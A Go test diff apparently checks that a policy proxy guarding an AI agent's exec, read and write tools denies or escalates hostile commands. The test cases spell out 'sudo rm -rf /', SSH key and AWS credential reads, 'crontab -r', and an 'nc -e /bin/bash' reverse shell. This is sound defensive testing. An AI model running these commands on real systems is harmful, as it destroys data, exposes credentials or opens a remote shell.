@@ -280,3 +280,116 @@ func setupStandardProxy(t *testing.T) *Server {
 
 	return New(eng, nil, WithToken("test-token-12345"))
 }
+
+// TestStandardPolicy_GlobEdgeCases tests specific glob patterns in the standard policy
+// that are easy to get wrong when ** vs * semantics differ.
+func TestStandardPolicy_GlobEdgeCases(t *testing.T) {
+	srv := setupStandardProxy(t)
+	ts := httptest.NewServer(srv.handler())
+	defer ts.Close()
+
+	token := srv.Token()
+
+	tests := []struct {
+		name       string
+		tool       string
+		params     map[string]any
+		wantStatus int
+		wantAction string
+		note       string
+	}{
+		{
+			// sudo rm -rf / should hit require-privileged-approval (sudo **), NOT
+			// block-destructive (rm -rf /), because the command starts with "sudo".
+			name:       "exec: sudo rm -rf / → require_approval (sudo wins, not deny)",
+			tool:       "exec",
+			params:     map[string]any{"command": "sudo rm -rf /"},
+			wantStatus: http.StatusAccepted,
+			wantAction: "require_approval",
+			note:       "sudo ** pattern in require-privileged-approval triggers before deny patterns",
+		},
+		{
+			// cat /root/.ssh/id_rsa via exec is caught by block-credential-commands.
+			name:       "exec: cat /root/.ssh/id_rsa → denied (block-credential-commands)",
+			tool:       "exec",
+			params:     map[string]any{"command": "cat /root/.ssh/id_rsa"},
+			wantStatus: http.StatusForbidden,
+			wantAction: "deny",
+			note:       "block-credential-commands catches cat **/.ssh/** patterns",
+		},
+		{
+			// head used on ssh key should also be blocked.
+			name:       "exec: head /home/user/.ssh/id_ed25519 → denied",
+			tool:       "exec",
+			params:     map[string]any{"command": "head /home/user/.ssh/id_ed25519"},
+			wantStatus: http.StatusForbidden,
+			wantAction: "deny",
+		},
+		{
+			// cat of a non-sensitive path should be allowed.
+			name:       "exec: cat README.md → allowed",
+			tool:       "exec",
+			params:     map[string]any{"command": "cat README.md"},
+			wantStatus: http.StatusOK,
+			wantAction: "allow",
+		},
+		{
+			// crontab -r is blocked (crontab deletion).
+			name:       "exec: crontab -r → denied",
+			tool:       "exec",
+			params:     map[string]any{"command": "crontab -r"},
+			wantStatus: http.StatusForbidden,
+			wantAction: "deny",
+		},
+		{
+			// reverse shell via nc -e.
+			name:       "exec: nc -e /bin/bash → denied (reverse shell)",
+			tool:       "exec",
+			params:     map[string]any{"command": "nc -e /bin/bash 10.0.0.1 4444"},
+			wantStatus: http.StatusForbidden,
+			wantAction: "deny",
+		},
+		{
+			// write to /etc/ should be blocked.
+			name:       "write: /etc/hosts → denied",
+			tool:       "write",
+			params:     map[string]any{"path": "/etc/hosts"},
+			wantStatus: http.StatusForbidden,
+			wantAction: "deny",
+		},
+		{
+			// read of ~/.aws/credentials should be blocked.
+			name:       "read: ~/.aws/credentials → denied",
+			tool:       "read",
+			params:     map[string]any{"path": "/home/user/.aws/credentials"},
+			wantStatus: http.StatusForbidden,
+			wantAction: "deny",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			body, _ := json.Marshal(map[string]any{
+				"agent":   "test-agent",
+				"session": "test-session",
+				"params":  tt.params,
+			})
+
+			url := fmt.Sprintf("%s/v1/tool/%s", ts.URL, tt.tool)
+			req, err := http.NewRequest(http.MethodPost, url, bytes.NewReader(body))
+			require.NoError(t, err)
+			req.Header.Set("Authorization", "Bearer "+token)
+			req.Header.Set("Content-Type", "application/json")
+
+			resp, err := http.DefaultClient.Do(req)
+			require.NoError(t, err)
+			defer resp.Body.Close()
+
+			assert.Equal(t, tt.wantStatus, resp.StatusCode, "HTTP status for %s", tt.name)
+
+			var result map[string]any
+			require.NoError(t, json.NewDecoder(resp.Body).Decode(&result))
+			assert.Equal(t, tt.wantAction, result["decision"], "action for %s (note: %s)", tt.name, tt.note)
+		})
+	}
+}
